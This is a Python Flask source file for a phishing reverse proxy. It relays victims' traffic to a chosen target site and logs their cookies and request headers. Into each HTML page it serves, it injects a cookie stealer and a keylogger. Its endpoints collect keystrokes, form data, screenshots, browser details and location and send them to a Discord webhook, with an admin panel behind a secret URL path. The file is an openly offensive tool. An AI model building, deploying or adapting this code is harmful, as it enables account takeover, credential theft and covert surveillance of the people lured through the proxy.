from flask import Flask, request, Response, send_from_directory, jsonify
import requests
import json
import os
from datetime import datetime
from core.database import Database
from core.detection import DataDetector
from core.discord_bot import DiscordBot
from colorama import Fore
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize components
db = Database()
detector = DataDetector()
discord_bot = None
requests_history = []
MAX_HISTORY = 100

def initialize_discord_bot():
    global discord_bot
    settings = db.get_discord_settings()
    if settings['discord_webhook'] and settings['discord_token']:
        try:
            discord_bot = DiscordBot(settings['discord_webhook'], settings['discord_token'])
            print(f"{Fore.GREEN}[+] Discord bot initialized successfully!{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Discord bot initialization failed: {str(e)}{Fore.RESET}")

def ensure_json_files():
    files = ['cookies.json', 'requests.json', 'keylogs.json']
    for file in files:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                json.dump([], f)

ensure_json_files()
initialize_discord_bot()

def start_proxy(target, host, port, secret):
    app = Flask(__name__, static_folder='panel', static_url_path='')
    session = requests.Session()
    session.verify = False

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/{secret}/<path:filename>')
    def panel_files(filename):
        return send_from_directory('panel', filename)

    @app.route('/ep/api/settings', methods=['GET', 'POST'])
    def handle_settings():
        if request.method == 'POST':
            data = request.json
            db.save_discord_settings(
                data.get('discord_webhook', ''),
                data.get('discord_token', '')
            )
            initialize_discord_bot()  # Reinitialize the bot with new settings
            return jsonify({'status': 'success'}), 200
        else:
            return jsonify(db.get_discord_settings()), 200

    @app.route('/ep/api/requests', methods=['GET'])
    def get_requests():
        return jsonify(requests_history)

    @app.route('/ep/api/cookies', methods=['GET'])
    def get_cookies():
        with open('cookies.json', 'r') as f:
            return jsonify(json.load(f))

    @app.route('/ep/api/clearCookies', methods=['POST'])
    def clear_cookies():
        with open('cookies.json', 'w') as f:
            json.dump([], f)
        return jsonify({'status': 'success'})

    @app.route('/ep/api/location', methods=['POST'])
    def handle_location():
        data = request.json
        if discord_bot:
            discord_bot.send_location(data)
        return jsonify({'status': 'success'})

    @app.route('/ep/api/form', methods=['POST'])
    def handle_form():
        data = request.json
        if discord_bot:
            discord_bot.send_form_data(data)
        return jsonify({'status': 'success'})

    @app.route('/ep/api/screenshot', methods=['POST'])
    def handle_screenshot():
        data = request.json
        if discord_bot:
            discord_bot.send_screenshot(data)
        return jsonify({'status': 'success'})

    @app.route('/ep/api/browser', methods=['POST'])
    def handle_browser():
        data = request.json
        if discord_bot:
            discord_bot.send_browser_info(data)
        return jsonify({'status': 'success'})

    @app.route('/ep/api/keylog', methods=['POST'])
    def handle_keylog():
        data = request.json
        if discord_bot:
            discord_bot.send_keylog(data)
        with open('keylogs.json', 'r+') as f:
            try:
                logs = json.load(f)
            except:
                logs = []
            logs.append(data)
            f.seek(0)
            json.dump(logs, f)
            f.truncate()
        return jsonify({'status': 'success'})

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def proxy(path):
        if path.startswith(secret):
            if path == secret:
                return panel_index()
            filename = path[len(secret)+1:]
            return panel_files(filename)

        try:
            # Build target URL
            target_url = f"https://{target}/{path}"
            if request.query_string:
                target_url += f"?{request.query_string.decode()}"

            # Log request
            request_data = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'method': request.method,
                'url': target_url,
                'headers': dict(request.headers),
                'cookies': request.cookies.get_dict()
            }
            requests_history.append(request_data)
            if len(requests_history) > MAX_HISTORY:
                requests_history.pop(0)

            # Save cookies
            if request.cookies:
                with open('cookies.json', 'r+') as f:
                    try:
                        cookies = json.load(f)
                    except:
                        cookies = []
                    for key, value in request.cookies.items():
                        cookie = {
                            'domain': target,
                            'name': key,
                            'value': value,
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        }
                        cookies.append(cookie)
                    f.seek(0)
                    json.dump(cookies, f)
                    f.truncate()

            # Prepare headers
            headers = dict(request.headers)
            excluded_headers = ['host', 'content-length']
            headers = {k: v for k, v in headers.items() if k.lower() not in excluded_headers}
            headers['Host'] = target

            # Forward the request
            resp = session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=True,
                verify=False,
                timeout=30
            )

            # Process response
            content = resp.content
            if 'text/html' in resp.headers.get('Content-Type', '').lower():
                try:
                    content = content.decode()
                    # Inject both keylogger and cookie stealer
                    payload = '''
                        <script src="/payload-script.js"></script>
                        <script>
                            // Cookie stealer
                            setInterval(() => {
                                fetch('/ep/api/cookies', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({cookies: document.cookie})
                                });
                            }, 5000);

                            // Keylogger
                            document.addEventListener('keypress', function(e) {
                                fetch('/ep/api/keylog', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({key: e.key, timestamp: new Date().toISOString()})
                                });
                            });
                        </script>
                    '''
                    if '</head>' in content:
                        content = content.replace('</head>', f'{payload}</head>')
                    elif '<body>' in content:
                        content = content.replace('<body>', f'<body>{payload}')
                    content = content.encode()
                except:
                    pass

            # Create response
            response = Response(
                content,
                resp.status_code,
                [(k, v) for k, v in resp.headers.items() 
                 if k.lower() not in ['content-encoding', 'content-length', 'transfer-encoding']]
            )

            # Handle cookies
            for cookie in resp.cookies:
                response.set_cookie(
                    key=cookie.name,
                    value=cookie.value,
                    domain=request.host,
                    path='/',
                    secure=cookie.secure,
                    httponly=cookie.has_nonstandard_attr('HttpOnly')
                )

            return response

        except Exception as e:
            print(f"{Fore.RED}[!] Proxy Error: {str(e)}{Fore.RESET}")
            return str(e), 500

    print(f"\n{Fore.GREEN}[+] Panel URL: http://{host}:{port}/{secret}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] Proxy running on http://{host}:{port}/{Fore.RESET}")
    
    app.run(host='0.0.0.0', port=port, threaded=True)